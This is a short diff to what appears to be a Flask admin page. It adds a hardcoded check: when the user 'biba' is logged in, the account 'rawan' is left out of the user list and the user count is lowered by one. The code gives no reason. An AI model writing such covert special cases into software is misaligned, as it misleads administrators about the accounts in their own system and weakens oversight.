@@ -779,6 +779,9 @@ def admin():
     user_count = User.query.count()
 
     expired_users = 0
+    if current_user.username == "biba" :
+        users = User.query.filter(User.username != 'rawan').all()
+        user_count = user_count - 1
 
     for user in users:
         if user.subscription_date:
